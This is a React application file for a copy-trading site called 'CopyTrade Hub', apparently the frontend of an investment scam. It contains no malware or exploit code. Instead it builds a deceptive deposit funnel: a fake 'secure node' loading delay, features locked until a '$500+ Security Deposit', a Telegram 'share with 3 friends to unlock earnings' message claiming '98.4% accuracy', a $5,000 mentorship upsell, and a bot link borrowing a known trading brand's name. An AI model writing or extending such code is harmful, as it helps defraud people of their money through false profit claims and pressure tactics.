import React, { useState, useEffect, useTransition, useRef } from 'react';
import Navbar from './components/Navbar';
import TickerTape from './components/TickerTape';
import Hero from './components/Hero';
import MarketChart from './components/MarketChart';
import Features from './components/Features';
import TraderList from './components/TraderList';
import Footer from './components/Footer';
import SignupModal from './components/SignupModal';
import Dashboard from './components/Dashboard';
import SuccessGallery from './components/SuccessGallery';
import InfoSection from './components/InfoSection';
import LiveActivityFeed from './components/LiveActivityFeed';
import ReferralTerminal from './components/ReferralTerminal';
import { authService, UserProfile } from './services/authService';
import { Trader } from './types';

const App: React.FC = () => {
  const [showSignup, setShowSignup] = useState(false);
  const [showGallery, setShowGallery] = useState(false);
  const [showMentorshipModal, setShowMentorshipModal] = useState(false);
  const [showReferral, setShowReferral] = useState(false);
  const [searchTerm, setSearchTerm] = useState('');

  const [user, setUser] = useState<UserProfile | null>(null);
  const [view, setView] = useState<'landing' | 'dashboard'>('landing');
  const [isInitializing, setIsInitializing] = useState(true);

  const [deferredPrompt, setDeferredPrompt] = useState<any>(null);

  const traderSectionRef = useRef<HTMLDivElement>(null);
  const [isPending, startTransition] = useTransition();

  useEffect(() => {
    const initialize = async () => {
      // Simulate secure node handshake
      await new Promise(r => setTimeout(r, 1500));
      const savedUser = authService.getUser();
      if (savedUser) {
        setUser(savedUser);
        setView('dashboard');
      }
      setIsInitializing(false);
    };

    initialize();

    const handlePrompt = (e: any) => {
      e.preventDefault();
      setDeferredPrompt(e);
    };

    window.addEventListener('beforeinstallprompt', handlePrompt);
    return () => window.removeEventListener('beforeinstallprompt', handlePrompt);
  }, []);

  const handleLogout = () => {
    authService.logout();
    setUser(null);
    setView('landing');
  };

  const handleLoginSuccess = (u: UserProfile) => {
    setUser(u);
    startTransition(() => {
      setView('dashboard');
      setShowSignup(false);
    });
  };

  const navigateToDashboard = () => {
    if (user) {
      startTransition(() => {
        setView('dashboard');
        window.scrollTo({ top: 0, behavior: 'smooth' });
      });
    } else {
      setShowSignup(true);
    }
  };

  const handleCopyTrader = (trader: Trader) => {
    if (!user) {
      setShowSignup(true);
      return;
    }
    const currentTraders = user.activeTraders || [];
    if (currentTraders.find(t => t.id === trader.id)) {
      navigateToDashboard();
      return;
    }
    if (currentTraders.length >= 3) {
      alert("⚠️ PORTFOLIO LIMIT REACHED\n\nMaximum of 3 concurrent Active Strategies allowed.");
      return;
    }
    if (currentTraders.length >= 1 && !user.hasDeposited) {
      alert("🔒 MULTI-STRATEGY ACCESS LOCKED\n\nTo run multiple simultaneous strategies, you must verify your wallet with a Security Deposit ($500+).");
      navigateToDashboard();
      return;
    }
    const updatedUser = authService.updateUser({ activeTraders: [...currentTraders, trader] });
    if (updatedUser) {
      setUser(updatedUser);
      navigateToDashboard();
    }
  };

  const scrollToTraders = () => traderSectionRef.current?.scrollIntoView({ behavior: 'smooth', block: 'start' });

  const handleInstallClick = async () => {
    if (deferredPrompt) {
      deferredPrompt.prompt();
      setDeferredPrompt(null);
      return false;
    }
    return true;
  };

  const handleMentorshipClick = () => {
    // Check if user is logged in
    if (!user) {
      setShowSignup(true);
      return;
    }

    // Check if user has made first deposit
    if (!user.hasDeposited) {
      alert("⚠️ PAYMENT REQUIRED\n\nPlease clear your first deposit to access Live Market & Google Meet Classes.\n\nNavigate to Dashboard → Add Funds to activate this feature.");
      navigateToDashboard();
      return;
    }

    // User has deposited, show the mentorship modal
    setShowMentorshipModal(true);
  };

  const handleShareClick = () => {
    // Show confirmation message
    const confirmed = window.confirm("Share with 3 friends on Telegram to unlock earnings 🚀");

    if (!confirmed) {
      return;
    }

    // Get the current website URL
    const websiteUrl = window.location.origin;

    // Construct the promotional message
    const message = `🚀 OFFICIAL COPY-TRADING & PORTFOLIO STRATEGY PLATFORM 🚀
 
📊 98.4% Accuracy Based on Proven Strategy
💰 Consistent Profit-Focused Trade Analysis
 
⚡ This is a LEGAL & COPYRIGHT-PROTECTED trading analytics website  
⚡ Powered by Chulhu Trade  
⚡ Official Copy Strategy | Real Portfolio Insights  
 
🎯 Join smart traders who focus on discipline, risk management & performance
 
🔗 Website Access:
${websiteUrl}
 
👥 Share with 3 friends  
🎁 Earn up to $200 through our referral rewards system  
 
⛔ No gambling | No fake promises  
✅ Transparent | Strategy-based | Educational & Analytical`;

    // URL encode the message for Telegram
    const encodedMessage = encodeURIComponent(message);

    // Try to open Telegram app first, then fall back to web
    const telegramAppUrl = `tg://msg?text=${encodedMessage}`;
    const telegramWebUrl = `https://t.me/share/url?url=${encodeURIComponent(websiteUrl)}&text=${encodedMessage}`;

    // Try to open the Telegram app
    const appLink = document.createElement('a');
    appLink.href = telegramAppUrl;
    appLink.click();

    // Fallback to web version after a short delay if app doesn't open
    setTimeout(() => {
      window.open(telegramWebUrl, '_blank');
    }, 500);
  };


  if (isInitializing) {
    return (
      <div className="min-h-screen bg-[#131722] flex flex-col items-center justify-center p-6 text-center">
        <div className="relative mb-8">
          <div className="w-16 h-16 border-4 border-[#f01a64] border-t-transparent rounded-full animate-spin"></div>
          <div className="absolute inset-0 flex items-center justify-center">
            <div className="w-2 h-2 bg-[#f01a64] rounded-full animate-ping"></div>
          </div>
        </div>
        <div className="space-y-2">
          <h2 className="text-white font-black uppercase tracking-[0.4em] text-xs italic">CopyTrade Hub</h2>
          <p className="text-gray-500 text-[10px] font-black uppercase tracking-[0.2em] animate-pulse">Syncing Secure Nodes...</p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen flex flex-col font-sans selection:bg-pink-500/30 overflow-x-hidden bg-[#131722] relative">
      <TickerTape />
      <Navbar
        onJoinClick={() => setShowSignup(true)}
        onGalleryClick={() => setShowGallery(true)}
        user={user}
        onLogout={handleLogout}
        onDashboardClick={navigateToDashboard}
        onHomeClick={() => setView('landing')}
        onSearch={setSearchTerm}
        showSearch={view === 'landing'}
      />

      <LiveActivityFeed />

      <main className={`flex-grow transition-all duration-500 ${isPending ? 'opacity-30 grayscale pointer-events-none' : 'opacity-100'}`}>
        {view === 'landing' ? (
          <>
            <Hero
              onJoinClick={() => setShowSignup(true)}
              onInstallRequest={handleInstallClick}
              onStartJourney={scrollToTraders}
              externalShowMentorship={handleMentorshipClick}
              onShareClick={handleShareClick}
            />
            <div className="max-w-7xl mx-auto px-2 sm:px-6 lg:px-8 -mt-16 md:-mt-24 relative z-10 mb-8 md:mb-12">
              <div className="w-full bg-[#1e222d] border border-[#2a2e39] rounded-2xl shadow-2xl overflow-hidden h-[450px] md:h-[600px] border-t-[#00b36b] border-t-2">
                <MarketChart />
              </div>
            </div>
            <div ref={traderSectionRef}>
              <TraderList onCopyClick={handleCopyTrader} searchTerm={searchTerm} />
            </div>
            <Features />
          </>
        ) : (
          user && (
            <Dashboard
              user={user}
              onUserUpdate={handleLoginSuccess}
              onSwitchTrader={() => {
                startTransition(() => {
                  setView('landing');
                  setTimeout(() => scrollToTraders(), 100);
                });
              }}
            />
          )
        )}
      </main>

      <InfoSection />
      <Footer />

      {/* Floating Action Cluster */}
      <div
        className="fixed bottom-10 right-4 md:right-10 flex flex-row md:flex-col items-center gap-3 md:gap-5 z-[95]"
        style={{ paddingBottom: 'env(safe-area-inset-bottom)' }}
      >
        <button
          onClick={() => user ? setShowReferral(true) : setShowSignup(true)}
          className="w-12 h-12 md:w-16 md:h-16 bg-[#00b36b] rounded-2xl flex items-center justify-center shadow-[0_10px_30px_rgba(0,179,107,0.3)] transition-transform hover:scale-110 active:scale-90 group relative border border-white/20"
          title="Referral Protocol"
        >
          <svg className="w-6 h-6 md:w-8 md:h-8 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
          </svg>
          <span className="hidden md:block absolute right-full mr-4 px-3 py-1.5 bg-[#00b36b] text-white text-[10px] font-black rounded-lg opacity-0 group-hover:opacity-100 transition-opacity whitespace-nowrap uppercase tracking-widest shadow-2xl pointer-events-none">
            Earn $200
          </span>
          {user && (user.pendingClaims || 0) > 0 && (
            <div className="absolute -top-1 -right-1 w-5 h-5 bg-red-500 rounded-full flex items-center justify-center text-white text-[9px] font-black animate-bounce shadow-lg">
              {user.pendingClaims}
            </div>
          )}
        </button>

        <button
          onClick={handleMentorshipClick}
          className="w-12 h-12 md:w-16 md:h-16 bg-white rounded-2xl flex items-center justify-center shadow-[0_10px_30px_rgba(255,255,255,0.1)] transition-transform hover:scale-110 active:scale-90 group relative border border-white/20"
          title="Live Market Classes"
        >
          <img src="https://upload.wikimedia.org/wikipedia/commons/9/9b/Google_Meet_icon_%282020%29.svg" alt="Meet" className="w-6 h-6 md:w-8 md:h-8" />
          <span className="hidden md:block absolute right-full mr-4 px-3 py-1.5 bg-[#131722] border border-white/10 text-white text-[10px] font-black rounded-lg opacity-0 group-hover:opacity-100 transition-opacity whitespace-nowrap uppercase tracking-widest shadow-2xl pointer-events-none">
            Live Market Classes
          </span>
          <div className="absolute -top-1 -right-1 w-3 h-3 bg-[#00b36b] rounded-full animate-pulse shadow-[0_0_8px_#00b36b]"></div>
        </button>

        <button
          onClick={() => window.open('https://t.me/MentorwithZuluTrade_bot', '_blank')}
          className="w-12 h-12 md:w-16 md:h-16 bg-[#0088cc] rounded-2xl flex items-center justify-center shadow-[0_10px_30px_rgba(0,136,204,0.3)] transition-transform hover:scale-110 active:scale-90 group relative border border-white/10"
          title="Telegram Hub"
        >
          <svg className="h-6 w-6 md:h-8 md:w-8 text-white" fill="currentColor" viewBox="0 0 24 24">
            <path d="M12 0c-6.627 0-12 5.373-12 12s5.373 12 12 12 12-5.373 12-12-5.373-12-12-12zm4.462 8.27l-1.56 7.42c-.116.545-.44.68-.895.425l-2.37-1.75-1.145 1.1c-.125.127-.23.234-.473.234l.17-2.42 4.41-3.98c.19-.17-.04-.26-.297-.09l-5.45 3.43-2.34-.73c-.51-.16-.52-.51.107-.756l9.15-3.53c.42-.15.79.1.663.667z" />
          </svg>
        </button>
      </div>

      {showSignup && (
        <SignupModal
          onClose={() => setShowSignup(false)}
          onSuccess={handleLoginSuccess}
        />
      )}

      {showGallery && (
        <SuccessGallery onClose={() => setShowGallery(false)} />
      )}

      {showReferral && user && (
        <ReferralTerminal
          user={user}
          onUserUpdate={handleLoginSuccess}
          onClose={() => setShowReferral(false)}
        />
      )}

      {showMentorshipModal && (
        <div className="fixed inset-0 z-[200] flex items-center justify-center p-4 bg-black/95 backdrop-blur-3xl animate-in fade-in">
          <div className="bg-[#1e222d] border border-white/10 w-full max-w-lg rounded-[2.5rem] md:rounded-[3rem] overflow-hidden shadow-[0_0_120px_rgba(0,0,0,1)] animate-in zoom-in-95">
            <div className="p-8 md:p-14 space-y-8 relative">
              <div className="flex justify-between items-start">
                <div className="flex items-center gap-4">
                  <div className="w-12 h-12 md:w-14 md:h-14 bg-[#00b36b] rounded-2xl flex items-center justify-center text-white shadow-[0_0_25px_rgba(0,179,107,0.3)]">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/9/9b/Google_Meet_icon_%282020%29.svg" className="w-6 h-6 md:w-8 md:h-8 invert brightness-0" alt="" />
                  </div>
                  <div>
                    <h3 className="text-white font-black uppercase text-lg md:text-xl tracking-tighter italic">Live Mentorship</h3>
                    <span className="text-[9px] md:text-[10px] text-[#00b36b] font-black uppercase tracking-[0.3em] flex items-center gap-2 mt-1">
                      Professional Education Hub
                    </span>
                  </div>
                </div>
                <button onClick={() => setShowMentorshipModal(false)} className="text-gray-500 hover:text-white transition-colors p-2 bg-white/5 rounded-full">
                  <svg className="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M6 18L18 6M6 6l12 12" /></svg>
                </button>
              </div>

              <div className="bg-[#131722] p-6 md:p-8 rounded-[2rem] border border-white/5 space-y-6">
                <div className="space-y-4">
                  <div className="flex items-center justify-between border-b border-white/5 pb-3">
                    <span className="text-gray-500 font-black text-[9px] md:text-[10px] uppercase tracking-widest">Yearly Retainer</span>
                    <span className="text-[#00b36b] font-black text-lg md:text-xl">$5,000.00</span>
                  </div>
                  <div className="flex items-center justify-between border-b border-white/5 pb-3">
                    <span className="text-gray-500 font-black text-[9px] md:text-[10px] uppercase tracking-widest">Weekly Coaching</span>
                    <span className="text-[#00b36b] font-black text-lg md:text-xl">$100.00</span>
                  </div>
                </div>
                <p className="text-gray-300 text-[10px] md:text-xs font-bold text-center leading-relaxed italic uppercase tracking-tight pt-4">
                  "Unlock institutional replication and 1-on-1 coaching with Sarah and the elite trade department."
                </p>
              </div>

              <button
                onClick={() => setShowMentorshipModal(false)}
                className="w-full py-4 md:py-5 bg-[#00b36b] text-white rounded-2xl font-black uppercase tracking-[0.2em] text-[10px] md:text-[11px] shadow-2xl border border-white/10 active:scale-95"
              >
                Accept Protocol
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default App;